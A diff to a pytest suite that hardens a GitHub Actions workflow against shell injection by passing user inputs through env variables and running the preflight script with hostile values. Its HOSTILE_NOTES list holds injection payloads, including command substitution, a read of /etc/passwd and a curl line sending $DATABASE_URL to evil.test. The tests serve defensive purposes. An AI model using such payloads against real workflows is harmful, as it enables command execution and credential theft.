@@ -11,6 +11,8 @@ the scheduled sync workflow keeps its lanes, its shadow modes, its backfill
 default, and its credential-free observer.
 """
 
+import os
+import re
 import subprocess
 import tempfile
 from pathlib import Path
@@ -169,12 +171,12 @@ def test_the_preflight_requires_a_full_forty_character_sha(job):
 
 def test_the_preflight_compares_the_supplied_sha_to_the_resolved_commit(job):
     guard = _step(job, 'Refuse an unauthorized invocation')['run']
-    assert '"$EXPECTED_HEAD_SHA" != "$RESOLVED_SHA"' in guard
+    assert '"$INPUT_EXPECTED_HEAD_SHA" != "$RESOLVED_SHA"' in guard
 
 
 def test_the_preflight_requires_the_exact_confirmation_for_that_game(job):
     guard = _step(job, 'Refuse an unauthorized invocation')['run']
-    assert 'QUALIFY_NOOP_GAME_${GAME_PK}' in guard
+    assert 'QUALIFY_NOOP_GAME_${INPUT_GAME_PK}' in guard
 
 
 def test_the_checkout_pins_the_reviewed_commit(job):
@@ -221,7 +223,7 @@ def test_the_workflow_invokes_only_the_qualification_entry_point(workflow_text):
 
 def test_the_qualification_runs_exactly_one_game_from_the_input(job):
     run = _step(job, 'Run the no-op write qualification')['run']
-    assert '--game-pk "${{ inputs.game_pk }}"' in run
+    assert '--game-pk "$INPUT_GAME_PK"' in run
     assert run.count('--game-pk') == 1
 
 
@@ -301,13 +303,15 @@ def test_the_final_gate_is_not_continue_on_error(job):
 
 
 def test_a_failed_scan_upload_or_qualification_all_fail_the_gate(job):
-    gate = _step(job, 'Final qualification gate')['run']
-    for outcome in (
-        'steps.scan.outcome', 'steps.upload.outcome',
-        'steps.qualification.outcome',
-    ):
-        assert outcome in gate
-    assert gate.count('exit 1') >= 3
+    gate = _step(job, 'Final qualification gate')
+    env = gate.get('env') or {}
+    assert env['SCAN_OUTCOME'] == '${{ steps.scan.outcome }}'
+    assert env['UPLOAD_OUTCOME'] == '${{ steps.upload.outcome }}'
+    assert env['QUALIFICATION_OUTCOME'] == '${{ steps.qualification.outcome }}'
+    script = gate['run']
+    for variable in ('$SCAN_OUTCOME', '$UPLOAD_OUTCOME', '$QUALIFICATION_OUTCOME'):
+        assert variable in script
+    assert script.count('exit 1') >= 3
 
 
 def test_the_qualification_step_exits_with_its_own_verdict(job):
@@ -404,3 +408,200 @@ def test_public_sync_and_shadow_health_remain_separate(sync_workflow):
     assert jobs['shadow-activation-health']['needs'] == 'public-sync'
     for downstream in ('internal-enrichment', 'static-team-story-preview'):
         assert jobs[downstream]['needs'] == 'public-sync'
+
+
+# ── Shell boundary (Blocker 1) ──────────────────────────────────────────────
+# GitHub substitutes `${{ }}` into the script text BEFORE bash parses it, so an
+# expression inside a `run:` block turns user input into shell code — in a step
+# that holds production credentials. Sanitising in Python happens far too late.
+# Every user-controlled value must cross into the shell through `env:` only.
+
+USER_CONTROLLED_INPUTS = (
+    'game_pk', 'expected_head_sha', 'confirmation', 'operator_note',
+)
+
+EXPECTED_INPUT_ENV = {
+    'INPUT_GAME_PK': '${{ inputs.game_pk }}',
+    'INPUT_EXPECTED_HEAD_SHA': '${{ inputs.expected_head_sha }}',
+    'INPUT_CONFIRMATION': '${{ inputs.confirmation }}',
+    'INPUT_OPERATOR_NOTE': '${{ inputs.operator_note }}',
+}
+
+
+def _run_steps(job):
+    return [step for step in _steps(job) if step.get('run')]
+
+
+@pytest.mark.parametrize('name', USER_CONTROLLED_INPUTS)
+def test_no_input_expression_appears_inside_any_run_script(job, name):
+    for step in _run_steps(job):
+        assert '${{ inputs.%s' % name not in step['run'], step.get('name')
+        assert '${{ inputs.' not in step['run'], step.get('name')
+
+
+def test_no_github_expression_at_all_appears_inside_any_run_script(job):
+    """Broader than required, and deliberately so: it removes the whole class."""
+    for step in _run_steps(job):
+        assert '${{' not in step['run'], step.get('name')
+
+
+def test_every_user_controlled_input_crosses_the_boundary_through_env(job):
+    referencing = [
+        step for step in _run_steps(job)
+        if any(
+            variable in step['run'] for variable in EXPECTED_INPUT_ENV
+        )
+    ]
+    assert referencing, 'no step consumes the inputs at all'
+    for step in referencing:
+        env = step.get('env') or {}
+        for variable in EXPECTED_INPUT_ENV:
+            if variable in step['run']:
+                assert env.get(variable) == EXPECTED_INPUT_ENV[variable], (
+                    step.get('name'), variable,
+                )
+
+
+def test_the_preflight_receives_all_four_inputs_through_env(job):
+    env = _step(job, 'Refuse an unauthorized invocation').get('env') or {}
+    for variable, expression in EXPECTED_INPUT_ENV.items():
+        assert env.get(variable) == expression
+
+
+def test_the_qualification_step_receives_all_four_inputs_through_env(job):
+    env = _step(job, 'Run the no-op write qualification').get('env') or {}
+    for variable, expression in EXPECTED_INPUT_ENV.items():
+        assert env.get(variable) == expression
+
+
+def test_every_input_is_referenced_only_as_a_quoted_shell_variable(job):
+    """Each use must be exactly `"$VAR"` or `${VAR}` inside a quoted string.
+
+    A bare `$VAR` would word-split and glob-expand the value.
+    """
+    for step in _run_steps(job):
+        script = step['run']
+        for variable in EXPECTED_INPUT_ENV:
+            name = re.escape(variable)
+            total = len(re.findall(r'\$\{?' + name, script))
+            if not total:
+                continue
+            # "$VAR"
+            quoted = len(re.findall(r'"\$' + name + r'"', script))
+            # "...${VAR}..." — braced form, inside a double-quoted string
+            braced = len(re.findall(
+                r'"[^"\n]*\$\{' + name + r'\}[^"\n]*"', script,
+            ))
+            assert quoted + braced == total, (
+                step.get('name'), variable, total, quoted, braced,
+            )
+
+
+HOSTILE_NOTES = (
+    '$(touch /tmp/pwned)',
+    '`touch /tmp/pwned`',
+    '; touch /tmp/pwned',
+    '&& touch /tmp/pwned',
+    '| touch /tmp/pwned',
+    '" ; touch /tmp/pwned ; echo "',
+    "' ; touch /tmp/pwned ; echo '",
+    'line one\ntouch /tmp/pwned',
+    '$SECRET_KEY',
+    '${DATABASE_URL}',
+    '$(cat /etc/passwd)',
+    '"; curl http://evil.test -d "$DATABASE_URL',
+)
+
+
+@pytest.mark.parametrize('hostile', HOSTILE_NOTES)
+def test_a_hostile_operator_note_stays_inert_input_text(job, hostile, tmp_path):
+    """Execute the real preflight script with a hostile note.
+
+    The note must remain data. If any construction executed, the canary file
+    would exist.
+    """
+    script = _step(job, 'Refuse an unauthorized invocation')['run']
+    canary = tmp_path / 'pwned'
+    sha = 'a' * 40
+    env = {
+        'PATH': os.environ.get('PATH', ''),
+        'INPUT_GAME_PK': '824488',
+        'INPUT_EXPECTED_HEAD_SHA': sha,
+        'INPUT_CONFIRMATION': 'QUALIFY_NOOP_GAME_824488',
+        'INPUT_OPERATOR_NOTE': hostile.replace('/tmp/pwned', str(canary)),
+        'RESOLVED_SHA': sha,
+    }
+    path = tmp_path / 'preflight.sh'
+    path.write_text(script)
+    result = subprocess.run(
+        ['bash', str(path)], capture_output=True, text=True, env=env,
+    )
+    assert result.returncode == 0, result.stderr
+    assert not canary.exists(), 'the operator note executed a command'
+    assert 'Authorization preconditions satisfied.' in result.stdout
+
+
+@pytest.mark.parametrize('hostile', HOSTILE_NOTES)
+def test_a_hostile_game_pk_cannot_execute_and_is_refused(job, hostile, tmp_path):
+    script = _step(job, 'Refuse an unauthorized invocation')['run']
+    canary = tmp_path / 'pwned'
+    sha = 'a' * 40
+    env = {
+        'PATH': os.environ.get('PATH', ''),
+        'INPUT_GAME_PK': hostile.replace('/tmp/pwned', str(canary)),
+        'INPUT_EXPECTED_HEAD_SHA': sha,
+        'INPUT_CONFIRMATION': 'QUALIFY_NOOP_GAME_824488',
+        'INPUT_OPERATOR_NOTE': '',
+        'RESOLVED_SHA': sha,
+    }
+    path = tmp_path / 'preflight.sh'
+    path.write_text(script)
+    result = subprocess.run(
+        ['bash', str(path)], capture_output=True, text=True, env=env,
+    )
+    assert result.returncode == 1
+    assert not canary.exists(), 'the game_pk executed a command'
+
+
+@pytest.mark.parametrize('hostile', HOSTILE_NOTES)
+def test_a_hostile_confirmation_cannot_execute_and_is_refused(
+    job, hostile, tmp_path,
+):
+    script = _step(job, 'Refuse an unauthorized invocation')['run']
+    canary = tmp_path / 'pwned'
+    sha = 'a' * 40
+    env = {
+        'PATH': os.environ.get('PATH', ''),
+        'INPUT_GAME_PK': '824488',
+        'INPUT_EXPECTED_HEAD_SHA': sha,
+        'INPUT_CONFIRMATION': hostile.replace('/tmp/pwned', str(canary)),
+        'INPUT_OPERATOR_NOTE': '',
+        'RESOLVED_SHA': sha,
+    }
+    path = tmp_path / 'preflight.sh'
+    path.write_text(script)
+    result = subprocess.run(
+        ['bash', str(path)], capture_output=True, text=True, env=env,
+    )
+    assert result.returncode == 1
+    assert not canary.exists(), 'the confirmation executed a command'
+
+
+def test_a_hostile_sha_cannot_execute_and_is_refused(tmp_path, job):
+    script = _step(job, 'Refuse an unauthorized invocation')['run']
+    canary = tmp_path / 'pwned'
+    env = {
+        'PATH': os.environ.get('PATH', ''),
+        'INPUT_GAME_PK': '824488',
+        'INPUT_EXPECTED_HEAD_SHA': f'$(touch {canary})',
+        'INPUT_CONFIRMATION': 'QUALIFY_NOOP_GAME_824488',
+        'INPUT_OPERATOR_NOTE': '',
+        'RESOLVED_SHA': 'a' * 40,
+    }
+    path = tmp_path / 'preflight.sh'
+    path.write_text(script)
+    result = subprocess.run(
+        ['bash', str(path)], capture_output=True, text=True, env=env,
+    )
+    assert result.returncode == 1
+    assert not canary.exists()
